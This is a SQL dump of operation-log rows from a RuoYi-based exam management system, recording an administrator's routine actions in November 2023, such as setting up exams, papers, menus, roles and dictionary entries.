INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (453, '考试管理', 1, 'com.ruoyi.project.csp.controller.TbExamController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exam', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-11-03 16:28:41\",\"duration\":10,\"examName\":\"测试考试\",\"id\":4,\"isDelete\":0,\"paperId\":1,\"params\":{},\"users\":[101,102]}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-03 16:28:41', 49);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (454, '代码生成', 2, 'com.ruoyi.project.tool.gen.controller.GenController.editSave()', 'PUT', 1, 'admin', NULL, '/tool/gen', '127.0.0.1', '内网IP', '{\"businessName\":\"exam\",\"className\":\"TbExam\",\"columns\":[{\"capJavaField\":\"Id\",\"columnComment\":\"主键\",\"columnId\":55,\"columnName\":\"id\",\"columnType\":\"bigint\",\"createBy\":\"admin\",\"createTime\":\"2023-11-03 14:07:39\",\"dictType\":\"\",\"edit\":false,\"htmlType\":\"input\",\"increment\":true,\"insert\":true,\"isIncrement\":\"1\",\"isInsert\":\"1\",\"isPk\":\"1\",\"javaField\":\"id\",\"javaType\":\"Long\",\"list\":false,\"params\":{},\"pk\":true,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":1,\"superColumn\":false,\"tableId\":7,\"updateBy\":\"\",\"updateTime\":\"2023-11-03 14:24:40\",\"usableColumn\":false},{\"capJavaField\":\"ExamName\",\"columnComment\":\"考试名称\",\"columnId\":56,\"columnName\":\"exam_name\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-11-03 14:07:39\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"1\",\"isRequired\":\"1\",\"javaField\":\"examName\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":true,\"queryType\":\"LIKE\",\"required\":true,\"sort\":2,\"superColumn\":false,\"tableId\":7,\"updateBy\":\"\",\"updateTime\":\"2023-11-03 14:24:40\",\"usableColumn\":false},{\"capJavaField\":\"PaperId\",\"columnComment\":\"试卷id\",\"columnId\":57,\"columnName\":\"paper_id\",\"columnType\":\"bigint\",\"createBy\":\"admin\",\"createTime\":\"2023-11-03 14:07:39\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"0\",\"isRequired\":\"1\",\"javaField\":\"paperId\",\"javaType\":\"Long\",\"list\":true,\"params\":{},\"pk\":false,\"query\":false,\"queryType\":\"EQ\",\"required\":true,\"sort\":3,\"superColumn\":false,\"tableId\":7,\"updateBy\":\"\",\"updateTime\":\"2023-11-03 14:24:40\",\"usableColumn\":false},{\"capJavaField\":\"PaperName\",\"columnComment\":\"试卷名称\",\"columnId\":58,\"columnName\":\"paper_name\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-11-03 14:07:39\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-04 21:13:33', 93);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (455, '菜单管理', 1, 'com.ruoyi.project.system.controller.SysMenuController.add()', 'POST', 1, 'admin', NULL, '/system/menu', '127.0.0.1', '内网IP', '{\"children\":[],\"component\":\"stu/exam/index\",\"createBy\":\"admin\",\"icon\":\"skill\",\"isCache\":\"0\",\"isFrame\":\"1\",\"menuName\":\"在线考试\",\"menuType\":\"C\",\"orderNum\":6,\"params\":{},\"parentId\":0,\"path\":\"stu/exam\",\"perms\":\"stu:exam:list\",\"status\":\"0\",\"visible\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-04 21:19:02', 44);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (456, '角色管理', 2, 'com.ruoyi.project.system.controller.SysRoleController.edit()', 'PUT', 1, 'admin', NULL, '/system/role', '127.0.0.1', '内网IP', '{\"admin\":false,\"createTime\":\"2023-10-25 15:31:49\",\"dataScope\":\"1\",\"delFlag\":\"0\",\"deptCheckStrictly\":true,\"flag\":false,\"menuCheckStrictly\":true,\"menuIds\":[2034],\"params\":{},\"roleId\":101,\"roleKey\":\"student\",\"roleName\":\"学生\",\"roleSort\":3,\"status\":\"0\",\"updateBy\":\"admin\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-04 21:24:27', 79);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (457, '字典类型', 1, 'com.ruoyi.project.system.controller.SysDictTypeController.add()', 'POST', 1, 'admin', NULL, '/system/dict/type', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"dictName\":\"考试状态\",\"dictType\":\"exam_status\",\"params\":{},\"status\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-05 20:19:51', 65);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (458, '字典数据', 1, 'com.ruoyi.project.system.controller.SysDictDataController.add()', 'POST', 1, 'admin', NULL, '/system/dict/data', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"default\":false,\"dictLabel\":\"未开始\",\"dictSort\":0,\"dictType\":\"exam_status\",\"dictValue\":\"0\",\"listClass\":\"default\",\"params\":{},\"status\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-05 20:20:11', 69);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (459, '字典数据', 1, 'com.ruoyi.project.system.controller.SysDictDataController.add()', 'POST', 1, 'admin', NULL, '/system/dict/data', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"default\":false,\"dictLabel\":\"进行中\",\"dictSort\":1,\"dictType\":\"exam_status\",\"dictValue\":\"1\",\"listClass\":\"default\",\"params\":{},\"status\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-05 20:20:28', 69);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (460, '字典数据', 1, 'com.ruoyi.project.system.controller.SysDictDataController.add()', 'POST', 1, 'admin', NULL, '/system/dict/data', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"default\":false,\"dictLabel\":\"已结束\",\"dictSort\":2,\"dictType\":\"exam_status\",\"dictValue\":\"2\",\"listClass\":\"default\",\"params\":{},\"status\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-05 20:20:40', 77);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (461, '试卷管理', 3, 'com.ruoyi.project.cspApi.dataControl.TbPaperController.remove()', 'DELETE', 1, 'admin', NULL, '/dataControl/paper/del/3', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-06 09:49:04', 30);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (462, '试卷管理', 3, 'com.ruoyi.project.cspApi.dataControl.TbPaperController.remove()', 'DELETE', 1, 'admin', NULL, '/dataControl/paper/del/1', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-06 09:49:08', 24);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (463, '试卷管理', 3, 'com.ruoyi.project.cspApi.dataControl.TbPaperController.remove()', 'DELETE', 1, 'admin', NULL, '/dataControl/paper/del/2', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-06 09:49:10', 20);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (464, '试卷管理', 3, 'com.ruoyi.project.cspApi.dataControl.TbPaperController.remove()', 'DELETE', 1, 'admin', NULL, '/dataControl/paper/del/4', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-06 09:49:12', 21);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (465, '试卷管理', 3, 'com.ruoyi.project.cspApi.dataControl.TbPaperController.remove()', 'DELETE', 1, 'admin', NULL, '/dataControl/paper/del/5', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-06 09:49:14', 24);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (466, '试卷管理', 3, 'com.ruoyi.project.cspApi.dataControl.TbPaperController.remove()', 'DELETE', 1, 'admin', NULL, '/dataControl/paper/del/6', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-06 09:49:16', 23);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (467, '试卷管理', 3, 'com.ruoyi.project.cspApi.dataControl.TbPaperController.remove()', 'DELETE', 1, 'admin', NULL, '/dataControl/paper/del/7', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-06 09:49:18', 24);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (468, '题目管理', 1, 'com.ruoyi.project.cspApi.dataControl.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-11-06 10:02:02\",\"exerciseProgram\":\"<p><img src=\\\"/dev-api/profile/upload/2023/11/06/640_20231106100159A001.png\\\"></p>\",\"exerciseType\":-1,\"id\":98,\"params\":{},\"quesType\":1,\"remark\":\"\"}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":98}', 0, NULL, '2023-11-06 10:02:02', 42);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (469, '题目管理', 3, 'com.ruoyi.project.cspApi.dataControl.ExerciseController.remove()', 'DELETE', 1, 'admin', NULL, '/dataControl/exercise/98', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-06 10:02:25', 43);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (470, '试卷管理', 1, 'com.ruoyi.project.cspApi.dataControl.TbPaperController.save()', 'POST', 1, 'admin', NULL, '/dataControl/paper/save', '127.0.0.1', '内网IP', '{\"baseExerciseList\":[{\"id\":57,\"score\":2},{\"id\":18,\"score\":2},{\"id\":55,\"score\":2},{\"id\":62,\"score\":2},{\"id\":63,\"score\":2},{\"id\":20,\"score\":2},{\"id\":21,\"score\":2},{\"id\":12,\"score\":2},{\"id\":8,\"score\":2},{\"id\":65,\"score\":2},{\"id\":56,\"score\":2},{\"id\":19,\"score\":2},{\"id\":14,\"score\":2},{\"id\":59,\"score\":2},{\"id\":60,\"score\":2},{\"id\":13,\"score\":2},{\"id\":9,\"score\":2},{\"id\":52,\"score\":2},{\"id\":54,\"score\":2},{\"id\":58,\"score\":2}],\"completionProgramList\":[{\"id\":40,\"score\":14,\"scoreList\":{\"41\":3,\"42\":3,\"43\":3,\"44\":3,\"45\":2}},{\"id\":92,\"score\":10,\"scoreList\":{\"93\":2,\"94\":2,\"95\":2,\"96\":2,\"97\":2}}],\"paperName\":\"测试考试试卷\",\"readProgramList\":[{\"id\":79,\"score\":18,\"scoreList\":{\"80\":3,\"81\":3,\"82\":3,\"83\":3,\"84\":3,\"85\":3}},{\"id\":66,\"score\":18,\"scoreList\":{\"67\":3,\"68\":3,\"69\":3,\"70\":3,\"71\":3,\"72\":3}}],\"remark\":\"此试卷用于测试考试功能\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-06 10:06:32', 205);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (471, '考试管理', 1, 'com.ruoyi.project.cspApi.dataControl.TbExamController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exam', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-11-06 10:06:58\",\"duration\":60,\"examName\":\"测试考试\",\"id\":5,\"isDelete\":0,\"paperId\":8,\"params\":{},\"users\":[101,102]}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-06 10:06:58', 43);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (472, '代码生成', 6, 'com.ruoyi.project.tool.gen.controller.GenController.importTableSave()', 'POST', 1, 'admin', NULL, '/tool/gen/importTable', '127.0.0.1', '内网IP', '{\"tables\":\"tb_examination_info\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-06 16:59:33', 151);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (473, '试卷管理', 1, 'com.ruoyi.project.cspApi.dataControl.TbPaperController.save()', 'POST', 1, 'admin', NULL, '/dataControl/paper/save', '127.0.0.1', '内网IP', '{\"baseExerciseList\":[{\"id\":19,\"score\":50},{\"id\":60,\"score\":50}],\"completionProgramList\":[],\"paperName\":\"调试在线考试\",\"readProgramList\":[],\"remark\":\"此试卷用于调试在线考试\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-06 18:48:18', 66);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (474, '考试管理', 1, 'com.ruoyi.project.cspApi.dataControl.TbExamController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exam', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-11-06 18:48:37\",\"duration\":1,\"examName\":\"调试在线考试\",\"id\":6,\"isDelete\":0,\"paperId\":9,\"params\":{},\"users\":[101]}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-06 18:48:37', 41);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (475, '菜单管理', 1, 'com.ruoyi.project.system.controller.SysMenuController.add()', 'POST', 1, 'admin', NULL, '/system/menu', '127.0.0.1', '内网IP', '{\"children\":[],\"createBy\":\"admin\",\"icon\":\"job\",\"isCache\":\"0\",\"isFrame\":\"1\",\"menuName\":\"刷题练习\",\"menuType\":\"M\",\"orderNum\":7,\"params\":{},\"parentId\":0,\"path\":\"stu\",\"status\":\"0\",\"visible\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-06 20:45:32', 57);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (476, '菜单管理', 2, 'com.ruoyi.project.system.controller.SysMenuController.edit()', 'PUT', 1, 'admin', NULL, '/system/menu', '127.0.0.1', '内网IP', '{\"children\":[],\"createTime\":\"2023-11-06 20:45:32\",\"icon\":\"job\",\"isCache\":\"0\",\"isFrame\":\"1\",\"menuId\":2035,\"menuName\":\"刷题练习\",\"menuType\":\"M\",\"orderNum\":7,\"params\":{},\"parentId\":0,\"path\":\"stu/practice\",\"perms\":\"\",\"status\":\"0\",\"updateBy\":\"admin\",\"visible\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-06 20:46:11', 32);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (477, '菜单管理', 2, 'com.ruoyi.project.system.controller.SysMenuController.edit()', 'PUT', 1, 'admin', NULL, '/system/menu', '127.0.0.1', '内网IP', '{\"children\":[],\"component\":\"\",\"createTime\":\"2023-11-06 20:45:32\",\"icon\":\"job\",\"isCache\":\"0\",\"isFrame\":\"1\",\"menuId\":2035,\"menuName\":\"刷题练习\",\"menuType\":\"C\",\"orderNum\":7,\"params\":{},\"parentId\":0,\"path\":\"stu/practice\",\"perms\":\"stu:practice:list\",\"status\":\"0\",\"updateBy\":\"admin\",\"visible\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-06 20:47:33', 26);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (478, '菜单管理', 2, 'com.ruoyi.project.system.controller.SysMenuController.edit()', 'PUT', 1, 'admin', NULL, '/system/menu', '127.0.0.1', '内网IP', '{\"children\":[],\"component\":\"stu/practice/list\",\"createTime\":\"2023-11-06 20:45:32\",\"icon\":\"job\",\"isCache\":\"0\",\"isFrame\":\"1\",\"menuId\":2035,\"menuName\":\"刷题练习\",\"menuType\":\"C\",\"orderNum\":7,\"params\":{},\"parentId\":0,\"path\":\"stu/practice\",\"perms\":\"stu:practice:list\",\"status\":\"0\",\"updateBy\":\"admin\",\"visible\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-06 20:47:51', 28);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (479, '菜单管理', 2, 'com.ruoyi.project.system.controller.SysMenuController.edit()', 'PUT', 1, 'admin', NULL, '/system/menu', '127.0.0.1', '内网IP', '{\"children\":[],\"component\":\"stu/practice/index\",\"createTime\":\"2023-11-06 20:45:32\",\"icon\":\"job\",\"isCache\":\"0\",\"isFrame\":\"1\",\"menuId\":2035,\"menuName\":\"刷题练习\",\"menuType\":\"C\",\"orderNum\":7,\"params\":{},\"parentId\":0,\"path\":\"stu/practice\",\"perms\":\"stu:practice:list\",\"status\":\"0\",\"updateBy\":\"admin\",\"visible\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-06 20:50:37', 44);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (480, '菜单管理', 1, 'com.ruoyi.project.system.controller.SysMenuController.add()', 'POST', 1, 'admin', NULL, '/system/menu', '127.0.0.1', '内网IP', '{\"children\":[],\"component\":\"stu/error/index\",\"createBy\":\"admin\",\"icon\":\"list\",\"isCache\":\"0\",\"isFrame\":\"1\",\"menuName\":\"错题回顾\",\"menuType\":\"C\",\"orderNum\":8,\"params\":{},\"parentId\":0,\"path\":\"stu/error\",\"perms\":\"stu:error:list\",\"status\":\"0\",\"visible\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-07 09:24:29', 54);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (481, '代码生成', 6, 'com.ruoyi.project.tool.gen.controller.GenController.importTableSave()', 'POST', 1, 'admin', NULL, '/tool/gen/importTable', '127.0.0.1', '内网IP', '{\"tables\":\"tb_error_exercise\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-07 10:10:00', 133);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (482, '角色管理', 2, 'com.ruoyi.project.system.controller.SysRoleController.edit()', 'PUT', 1, 'admin', NULL, '/system/role', '127.0.0.1', '内网IP', '{\"admin\":false,\"createTime\":\"2023-10-25 15:31:49\",\"dataScope\":\"1\",\"delFlag\":\"0\",\"deptCheckStrictly\":true,\"flag\":false,\"menuCheckStrictly\":true,\"menuIds\":[2034,2035,2036],\"params\":{},\"roleId\":101,\"roleKey\":\"student\",\"roleName\":\"学生\",\"roleSort\":3,\"status\":\"0\",\"updateBy\":\"admin\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-07 11:29:25', 69);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (483, '个人信息', 2, 'com.ruoyi.project.system.controller.SysProfileController.updateProfile()', 'PUT', 1, 'admin', NULL, '/system/user/profile', '127.0.0.1', '内网IP', '{\"admin\":true,\"avatar\":\"\",\"createBy\":\"admin\",\"createTime\":\"2023-10-23 20:57:31\",\"delFlag\":\"0\",\"dept\":{\"ancestors\":\"0,100\",\"children\":[],\"deptId\":101,\"deptName\":\"管理部门\",\"leader\":\"若依\",\"orderNum\":1,\"params\":{\"@type\":\"java.util.HashMap\"},\"parentId\":100,\"status\":\"0\"},\"deptId\":101,\"email\":\"admin@163.com\",\"loginDate\":\"2023-11-07 11:04:18\",\"loginIp\":\"127.0.0.1\",\"nickName\":\"超级管理员\",\"params\":{\"@type\":\"java.util.HashMap\"},\"phonenumber\":\"15888888888\",\"remark\":\"管理员\",\"roles\":[{\"admin\":true,\"dataScope\":\"1\",\"deptCheckStrictly\":false,\"flag\":false,\"menuCheckStrictly\":false,\"params\":{\"@type\":\"java.util.HashMap\"},\"roleId\":1,\"roleKey\":\"admin\",\"roleName\":\"超级管理员\",\"roleSort\":1,\"status\":\"0\"}],\"sex\":\"1\",\"status\":\"0\",\"userId\":1,\"userName\":\"admin\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-07 14:33:29', 106);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (484, '菜单管理', 3, 'com.ruoyi.project.system.controller.SysMenuController.remove()', 'DELETE', 1, 'admin', NULL, '/system/menu/117', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-07 14:35:43', 46);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (485, '菜单管理', 3, 'com.ruoyi.project.system.controller.SysMenuController.remove()', 'DELETE', 1, 'admin', NULL, '/system/menu/3', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"存在子菜单,不允许删除\",\"code\":601}', 0, NULL, '2023-11-07 14:35:47', 18);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (486, '菜单管理', 3, 'com.ruoyi.project.system.controller.SysMenuController.remove()', 'DELETE', 1, 'admin', NULL, '/system/menu/115', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-07 14:35:52', 44);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (487, '菜单管理', 3, 'com.ruoyi.project.system.controller.SysMenuController.remove()', 'DELETE', 1, 'admin', NULL, '/system/menu/116', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"存在子菜单,不允许删除\",\"code\":601}', 0, NULL, '2023-11-07 14:35:56', 15);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (488, '菜单管理', 3, 'com.ruoyi.project.system.controller.SysMenuController.remove()', 'DELETE', 1, 'admin', NULL, '/system/menu/1055', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-07 14:35:59', 41);
